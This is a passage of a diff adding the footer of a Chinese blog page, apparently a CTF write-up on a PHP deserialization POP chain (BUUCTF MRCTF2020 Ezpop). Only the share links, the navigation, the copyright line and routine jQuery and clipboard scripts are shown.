+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/04/23/BUUCTF-WEB-MRCTF2020-Ezpop-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/&text=BUUCTF-WEB-[MRCTF2020]Ezpop-php反序列化pop链"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/04/23/BUUCTF-WEB-MRCTF2020-Ezpop-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/&title=BUUCTF-WEB-[MRCTF2020]Ezpop-php反序列化pop链"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/04/23/BUUCTF-WEB-MRCTF2020-Ezpop-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/&is_video=false&description=BUUCTF-WEB-[MRCTF2020]Ezpop-php反序列化pop链"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUCTF-WEB-[MRCTF2020]Ezpop-php反序列化pop链&body=Check out this article: http://example.com/2022/04/23/BUUCTF-WEB-MRCTF2020-Ezpop-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/04/23/BUUCTF-WEB-MRCTF2020-Ezpop-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/&title=BUUCTF-WEB-[MRCTF2020]Ezpop-php反序列化pop链"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/04/23/BUUCTF-WEB-MRCTF2020-Ezpop-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/&title=BUUCTF-WEB-[MRCTF2020]Ezpop-php反序列化pop链"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/04/23/BUUCTF-WEB-MRCTF2020-Ezpop-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/&title=BUUCTF-WEB-[MRCTF2020]Ezpop-php反序列化pop链"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/04/23/BUUCTF-WEB-MRCTF2020-Ezpop-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/&title=BUUCTF-WEB-[MRCTF2020]Ezpop-php反序列化pop链"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/04/23/BUUCTF-WEB-MRCTF2020-Ezpop-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/&name=BUUCTF-WEB-[MRCTF2020]Ezpop-php反序列化pop链&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/04/23/BUUCTF-WEB-MRCTF2020-Ezpop-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/&t=BUUCTF-WEB-[MRCTF2020]Ezpop-php反序列化pop链"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    Imp1ture
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/tags/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
